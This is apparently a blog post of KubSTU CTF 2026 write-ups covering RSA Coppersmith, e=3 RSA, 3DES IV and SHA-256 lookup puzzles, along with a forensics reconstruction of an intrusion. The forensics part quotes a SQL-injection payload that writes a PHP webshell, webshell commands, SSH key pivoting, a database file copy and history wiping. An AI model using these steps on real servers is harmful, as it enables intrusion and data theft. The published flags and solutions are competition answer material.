# :game_die: Medium

---

# **KubSTU CTF 2026 Writeups: Five Challenges, Saturday*Forensics, RSA, 3DES, and a folder of 1,890 cat-girls .. what I learned solving the KubSTU CTF*— -**

I played KubSTU CTF this year and ended up with notes on five challenges that I think are worth sharing. Four of them are crypto, one is forensics, and one of them (you’ll see which) made me question my life choices for about three hours before the trick clicked.

Instead of dropping five separate posts, I’m bundling them into one walkthrough. If you only care about a specific category, the headers below should make it easy to skip around. Every flag and every solver is here, but I’ve tried to spend more time on the **thinking** — what I tried, what didn’t work, and the moment things finally fell into place.

**Quick index:**

>

**[Crypto — Not Enough (Part 1)]: **RSA with leaked high bits of `p`, solved with Coppersmith

**[Crypto — Unlucky 13]:** Three layers of “encryption”, one cube root

**[Crypto — Nintendo 3DS]: **3DES with a hidden IV

**[Crypto — Cat-girl Conspiracy]: **1,890 JPGs and a SHA-256 lookup table

**[Forensics — Demo]: **SQLi → webshell → SSH pivot → DB exfil

**— -**

### **Crypto: Not Enough (Part 1)**

*RSA with the high bits of one prime leaked, plus an AES-GCM ciphertext keyed by some RSA secret.*

The challenge hands us a 1024-bit RSA modulus, the public exponent, the **high bits of one prime**, and an AES-GCM ciphertext:

```
N = 151708532784988710186354895816447243710932251919…931391
e = 65537
p_hi = 2615850379731327725778203313365784512838922702185011257029931947846122736769634242897120915009678837272252972592332233245419497072070
nonce = 8fe6c8d25d0738576b6f6a25
ciphertext = 0094dfe5f358aecb96369cf72731d114bf0a0008cbe1d15b98b30f4fd1492e0ee1567a7fd602dc3ff7aa709ea98e7c06eb261c
tag = 9755d120d8356f29ca31eacff3360ab0
```

The AES key is derived from one of {p, q, d}:

```
key = sha256(long_to_bytes(secret)).digest()[:16]
```

**### Counting bits before doing anything else**

Whenever I see “high bits of `p`” in an RSA challenge, the very first thing I do is count what’s missing:

```
| value | bits |
| - -| - -|
| `N` | 1024 |
| `p` | ~512 |
| `p_hi` | 440 |
| unknown low bits of `p` | 72 |
```

72 bits is too many to brute force (around `4.7 × 10²¹` candidates) but it’s well below the **Coppersmith bound** of `N^(1/4) ≈ 2²⁵⁶`. That’s the green light.

**### Coppersmith / Howgrave-Graham, briefly**

The univariate Coppersmith result (in Howgrave-Graham’s formulation) says: given a polynomial `f(x)` of degree `d` and a known multiple `N` of an unknown divisor `b ≥ N^β`, you can recover all integer roots `x_0` of `f(x) ≡ 0 (mod b)` with `|x_0| < N^(β²/d − ε)` in polynomial time.

Here:

```
- `f(x) = (p_hi << 72) + x`, monic linear, so `d = 1`
- `b = p`, with `p ≈ N^(1/2)`, so `β = 1/2`
```

- The bound becomes `|x_0| < N^(1/4) ≈ 2²⁵⁶`, comfortably above our 72 unknown bits

Even a tiny `m = t = 2` lattice (5×5) is enough. Build the standard Howgrave-Graham basis, LLL it, take any short row, recover the polynomial, find its small integer roots with `mpmath.polyroots`, and verify by exact integer evaluation.

**### Don’t forget the AES-GCM step**

The decryption secret could be `p`, `q`, **or** `d`. Pure laziness wins here: try all three, and the GCM tag tells you which one was right (this is essentially free because GCM verification is fast and unforgeable).

In my run, the secret turned out to be `d`, the private exponent. Plug it through the SHA-256 KDF, decrypt with AES-GCM, and:

```
[+] Hit! k=72, m=2, x0=1277292877421571572747
[+] AES-GCM authenticated with secret = d
[+] FLAG: KubSTU{1_h0p3_y0u_solv3d_7hi5_wi7h0ut_4ny_pr0bl3m5}
```

**Flag: ***KubSTU{1_h0p3_y0u_solv3d_7hi5_wi7h0ut_4ny_pr0bl3m5}*

**Takeaway:** count the unknown bits before reaching for any cryptanalysis tool. If you’re under `N^(1/4)`, Coppersmith works and you don’t need to crank `m` up. Also: when there are multiple plausible secrets, AES-GCM’s tag is a free oracle, use it.

**— -**

### **Crypto: Unlucky 13**

*Three “layers” of encryption — and every key is a public constant.*

This one looks intimidating until you actually read the source. The pipeline is:

- **Layer 1**: XOR with the output of `cursed_prng(seed=13, length=…)`, an LCG over `2³²`.

- **Layer 2**: RC4 with key `sha256(b”Unlucky” + b”13")[:16]`.

- **Layer 3:** RSA encrypt with `e = 3` and a 2048-bit modulus.

We’re given `(n, e, c)` and the `encrypt.py` source.

**### Why every “key” is fake**

Layers 1 and 2 contribute zero security:

- The LCG seed is the literal constant `13` baked into the source. Anyone reading the file can regenerate the keystream byte-for-byte.

- The RC4 key is the SHA-256 of two literal byte strings, also in the source.

That leaves Layer 3 — and Layer 3 is **textbook RSA with `e = 3`**.

**### The bit budget**

```
| value | bits |
| - -| - -|
| `n` | 2048 |
| flag (52 bytes) | 416 |
| `m` (= layer 2 output as int) | ~415 |
| `m³` | ~1245 |
```

`m³ < n`, so the modular reduction inside RSA never actually fires:

```
c = m³ mod n = m³ (because m³ < n)
```

That means `m = ⌊∛c⌋` exactly. No factoring, no Coppersmith, no LLL, just a plain integer cube root.

**### Solver in three lines (morally)**

1. Cube-root `c` (binary search `iroot`); assert `m³ == c`.

2. RC4-decrypt with `sha256(b”Unlucky13")[:16]`.

3. XOR with `cursed_prng(13, len)`.

```
recovered m: 52 bytes
FLAG: KubSTU{unLucky_13_l4y3r5_0f_encrypt10n_n0_luck_h3r3}
```

**Flag: ***KubSTU{unLucky_13_l4y3r5_0f_encrypt10n_n0_luck_h3r3}*

**Takeaway:** layered encryption only helps if at least one layer holds genuine secret material. And whenever you see a small `e` in a CTF, the very first thing to check is whether `bit_length(m) × e < bit_length(n)`. If it is, the modular reduction is a no-op and you win for free.

**— -**

### **Crypto: Nintendo 3DS**

*Three sub-keys in three different encodings, and two red-herring IVs whose XOR is the real one.*

`challenge.txt` gives us:

```
CBC+PKCS5
1 = TjFudDNuZG8=
2 = 83 51 99 117 114 49 116 121
3 = 4b33792132303236
ivx = 0a001f0273760054
ivm = M4r10Br0
072a8e75459a545679f3aa56a9fafb38871022de0c9bd5d7ef55e8dad7861662eb0fb630d9cdf9dd8c64a3a8ac28b86a
```

Decoding each “key” line under its obvious encoding:

```
| line | encoding | bytes |
| - -| - -| - -|
| `1` | base64 | `N1nt3ndo` |
| `2` | decimal byte values | `S3cur1ty` |
| `3` | hex | `K3y!2026` |
```

24 bytes of key material + 8-byte block + PKCS5 padding ⇒ this is **Triple DES (3DES) in CBC mode**. The challenge title’s “3DS” is doing double duty — Nintendo 3DS *and* 3DES.

**### Two IVs, none of which work alone**

The ciphertext is 48 bytes (6 DES blocks). We’re given two candidate IVs. Decrypting with each one in turn produces:

```
iv=ivx → b'\x06A\x10bd\x17\t\x03d3s_n1nt3nd0_cbc_m0d3_n07_h4rd_3n0ugh}'
iv=ivm → b"Au}Q'#{gd3s_n1nt3nd0_cbc_m0d3_n07_h4rd_3n0ugh}"
```

The **tail** is identical (`d3s_n1nt3nd0_cbc_m0d3_n07_h4rd_3n0ugh}`) but the first block is garbage in both cases. That’s CBC’s signature: the IV only affects the first plaintext block. Same key, wrong IV.

Since `ivm` is already a leetspeak word (“M4r10Br0” → “Mario Bro”), I tried the obvious algebraic move:

```
ivx : 0a 00 1f 02 73 76 00 54
ivm : 4d 34 72 31 30 42 72 30 ("M4r10Br0")
ivx XOR ivm: 47 34 6d 33 43 34 72 64 ("G4m3C4rd")
```

`G4m3C4rd`: Nintendo’s physical cartridge format. Decrypt with that as IV and the first block snaps into `KubSTU{3`.

**Flag: ***KubSTU{3d3s_n1nt3nd0_cbc_m0d3_n07_h4rd_3n0ugh}*

**Takeaway:** when you suspect a wrong IV in CBC, decrypt anyway. Blocks 2..N tell you whether the key is right; a coherent tail means the only problem is block 1, and that narrows the search down to “fix one 8-byte value.” When the challenge gives you **two** IVs, the algebraic combinations (XOR, swap, concat) are basically always worth a shot.

**— -**

### **Crypto: Cat-girl Conspiracy**

*”64 — what could this mean?” A folder of 1,890 anime cat-girl JPGs and a 1,984-byte hex blob that, despite every cryptographic instinct screaming otherwise, isn’t encrypted at all.*

## Get Abdelkader Belcaid’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Original challenge name: `64_what_could_this_mean`. Category: Crypto (allegedly).

Structure on disk:

```
64_what_could_this_mean/
├── what_could_this_mean.txt # 3968-char hex (1984 bytes)
├── 0/ *.jpg × 50
├── 1/ *.jpg × 48
├── …
├── Z/ *.jpg × 47
├── _/ *.jpg × 57
├── {/ *.jpg × 47
└── }/ *.jpg × 47
```

39 directories — one per valid flag character (`[0–9A-Z_{}]`), totalling 1,890 JPGs. Every filename is exactly **16 hex characters (8 bytes)**, which is suspiciously block-shaped.

The “64” + 8-byte filenames + 8-byte cipher blocks combo screams **DES** so loudly it feels like the author is daring you to try it.

**### The rabbit holes**

I spent way too long on the DES reading. In rough order of attempts:

1. Direct lookup of every 8-byte chunk against the filename map. `0/248`.

2. CBC-style chaining (`C[i] ⊕ C[i-1]` as the filename). `0/247`.

3. XOR-mask recovery assuming a likely first-character folder (`F`, `{`, `_`…). Best score: 1.

4. DES-ECB with each filename as the master key. Nothing.

5. DES-ECB with title-derived keys (`b’64______’`, `b’whatcoul’`, `b’thismean’`, hashed forms…). Nothing.

6. Per-block keys: `C[i] = E_filename(plaintext)` for plausible plaintexts. Nothing.

7. AES variants with title-derived keys. Nothing.

8. Filename as a function of JPG content (MD5/SHA-1/SHA-256 prefix, with and without folder-byte salt, HMAC keyed by folder). Nothing.

9. Single-byte XOR, byte reversal, bit reversal, NOT, byteswap, rotates. Nothing.

10. JPG steganography. Clean files: no `COM`/`APP1` payload, no trailing data after `FFD9`, no anomalous EXIF. Just cat-girls.

The breakthrough came from a desperation pass: *what if the relationship isn’t filename ↔ block, but ***JPG content*** ↔ block?*

Hashing every JPG with SHA-256 and grepping the blob for any of those digests scored **62 / 248** chunks. Of course it did — SHA-256 outputs **32 bytes = 4 of the “DES blocks” **I’d been carving the blob into. The block size was four times what the title was nudging me toward.

**### The real scheme**

The author almost certainly did:

```
flag = "KUBSTU{A7_LE4ST_N0W_Y0U_H4V3_A_BUNCH_0F_P1CTUR3S_OF_C4T_GIRL5}"
out = b""
for ch in flag:
jpg = random.choice(os.listdir(ch))
out += sha256(open(f"{ch}/{jpg}", "rb").read()).digest()
```

Each character commits to a *random *picture from its folder. The 47–57 JPGs per folder are homophonic substitutions; SHA-256 is the (one-way) “encryption.” Different runs of the encoder would emit different blobs that all decode to the same flag.

**Solver:**

1. Walk the directory; for each `<char>/<file>.jpg` compute `sha256(content)` and store `digest → char`.

2. Read the blob, hex-decode.

3. Chunk into 32-byte pieces, look each up, concatenate.

```
[+] Hashed 1890 JPGs across 39 folders
[+] Ciphertext: 1984 bytes = 62 chunks of 32 bytes
[+] Flag: KUBSTU{A7_LE4ST_N0W_Y0U_H4V3_A_BUNCH_0F_P1CTUR3S_OF_C4T_GIRL5}
```

**Flag: ***KUBSTU{A7_LE4ST_N0W_Y0U_H4V3_A_BUNCH_0F_P1CTUR3S_OF_C4T_GIRL5}*

**Takeaway:** read the hint at the level the author intended, not at the level your training screams at you. “64” can mean 64 bits, 64 bytes, 64 characters, or just be a challenge number. Concatenated cryptographic hashes look identical to ciphertext on every byte-frequency test, uniform distribution, no repeats. Before reaching for cryptanalysis, hash every available file and grep the blob. If the blob was built from those files, you’ll see it immediately.

**— -**

### **Forensics: Demo**

*During a security audit, suspicious activity was detected on the company’s web server. An attacker penetrated the network, moved to the database server, and stole confidential information. Identify the initial-access vulnerability, what was uploaded, the post-exploitation user, and what was copied.*

Expected flag format: *KubSTU{vuln,upload,user,file}*.

**### What we’re given**

Two host disk-image dumps:

```
Demo/
├── service/ # web server (Apache + PHP)
│ ├── home/www-data/
│ │ ├── .bash_history
│ │ └── .ssh_key_key # OpenSSH private key
│ └── var/
│ ├── log/apache2/{access,error}.log
│ └── www/html/{index,admin,config,contact}.php
└── DB/ # database server (MySQL)
├── home/dbadmin/
│ ├── .bash_history
│ └── .ssh_authorized_keys
├── etc/mysql/my.cnf
└── var/log/auth.log
```

Two hosts: a public web server and an internal DB server. The job is to reconstruct how the attacker moved from one to the other.

**### Step 1 — The vulnerability**

`service/var/www/html/index.php` is a one-page article viewer that drops `$_GET[‘id’]` straight into a SQL query:

```
$id = $_GET['id'];
$sql = "SELECT title, content FROM articles WHERE id = $id";
$result = $conn->query($sql);
```

No casting, no prepared statement — classic **SQL injection**.

The access log confirms it within seconds:

```
192.168.1.100 - - [26/Mar/2026:10:15:30] "GET /index.php?id=1 UNION SELECT 1,@@datadir HTTP/1.1" 200 120 "-" "sqlmap/1.6.12"
```

`sqlmap/1.6.12` user-agent + `UNION SELECT 1,@@datadir` payload = the attacker fingerprinted MySQL via SQLi.

**### Step 2 — What got uploaded**

A few seconds later, the same IP abuses MySQL’s `INTO OUTFILE` to drop a PHP webshell into the document root:

```
192.168.1.100 - - [26/Mar/2026:10:16:05] "GET /index.php?id=1 UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/uploads/shell.php' HTTP/1.1" 200 12 "-" "sqlmap/1.6.12"
```

That decodes to:

```
UNION SELECT 1, '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/uploads/shell.php'
```

The uploaded file is **`shell.php`: **a one-line OS-command webshell. The next two log lines confirm it works:

```
GET /uploads/shell.php?cmd=id 200 30
GET /uploads/shell.php?cmd=ls -la /home/www-data 200 200
```

**### Step 3 — Lateral movement**

Listing `/home/www-data` exposed `.ssh_key_key`, an unencrypted OpenSSH RSA private key with the comment `ubuntu@22515475ef29`. The matching public key is sitting in `DB/home/dbadmin/.ssh_authorized_keys`, same hostname, same key material. So a key meant for `dbadmin` on the DB box was world-readable on the web host. Game over.

The DB’s `auth.log` shows the login moments later:

```
Mar 26 10:16:30 victim-db sshd[5680]: Accepted publickey for dbadmin from 192.168.1.10 port 54323 ssh-rsa SHA256:hK6cLRP4m5w60fHK1BGmWooBTXIWz+vtVHmuH/luoVQ
Mar 26 10:16:31 victim-db sshd[5681]: pam_unix(sshd:session): session opened for user dbadmin by (uid=0)
Mar 26 10:16:35 victim-db sudo: dbadmin : TTY=pts/0 ; PWD=/home/dbadmin ; COMMAND=/bin/bash
Mar 26 10:16:36 victim-db sudo: pam_unix(sudo:auth): authentication failure … user=root
Mar 26 10:17:00 victim-db sshd[5681]: session closed for user dbadmin
```

Post-exploitation user: **`dbadmin`** (sudo to root failed — they didn’t need it).

**### Step 4 — What was copied**

`DB/home/dbadmin/.bash_history`:

```
mysql -u root -p
use webapp_db;
SELECT * FROM sensitive_info;
SHOW DATABASES;
SHOW TABLES;
DESCRIBE sensitive_info;
cp /var/lib/mysql/confidential_data.sql /tmp/.backup_data
ls -la /tmp/
cat /tmp/.backup_data
rm /tmp/.backup_data
history -c
```

The attacker copied **`confidential_data.sql`** out of MySQL’s data directory to a dot-prefixed file in `/tmp`, read it, deleted the temp copy, and tried to wipe history — but the file we’re reading is what they ran **before** `history -c`. Classic.

**### The chain**

1. **SQLi** in `index.php?id=` (sqlmap-driven).

2. `UNION SELECT … INTO OUTFILE` writes **`shell.php`** to `/var/www/html/uploads/`.

3. Webshell reads `/home/www-data/.ssh_key_key` — an SSH key authorized for `dbadmin` on the DB host.

4. SSH in as **`dbadmin`** with key auth (sudo to root fails, but doesn’t need to).

5. `cp /var/lib/mysql/confidential_data.sql /tmp/.backup_data`, exfil **`confidential_data.sql`**

6. `history -c` to cover tracks. Too late.

**Flag:** *KubSTU{SQLi,shell.php,dbadmin,confidential_data.sql}*

**Takeaway:** the artifact you most want as a defender is also the cheapest one to get right, log retention. The whole chain in this challenge is reconstructible from `access.log` + `auth.log` + two `.bash_history` files. None of that requires special tooling. None of it requires expensive EDR. It just requires that the logs *exist* and that you read them.

**— -## Closing thoughts**

A few patterns held across these five:

- **Read the source / artifacts before reaching for the heavy artillery.** Unlucky 13 dissolves in three function calls once you accept that every “key” is in plaintext. Demo dissolves into a four-tuple flag once you read the access log honestly. The flashy attack is rarely the right one.

- **Count bits!** Crypto Not Enough (Coppersmith bound) and Unlucky 13 (`m^e < n`) both come down to a one-line bit-budget check. Always do that first.

- **The hint is a hint, not a translation! **Cat-girl Conspiracy’s “64” was **64 hex characters** (a SHA-256 hex digest), not 64-bit DES blocks. I lost an embarrassing chunk of time to that misread.

- **CBC’s IV touches one block only! **When you see partial-garbage / partial-sense plaintext, you almost certainly have the right key and the wrong IV. Diagnose, don’t restart.

Big thanks to the KubSTU organisers for a fun set! 😊

**— -**

*Tags: *`*#ctf*`*, *`*#cybersecurity*`*, *`*#cryptography*`*, *`*#digital-forensics*`*, *`*#forensics*`* ,*`*#infosec*`*, *`*#writeup*`*,*`*#kubstu-ctf*`*,*`*#rsa*`*, *`*#coppersmith*`*,*`*#SQLi*`* ,*`*#sql-injection*`

---
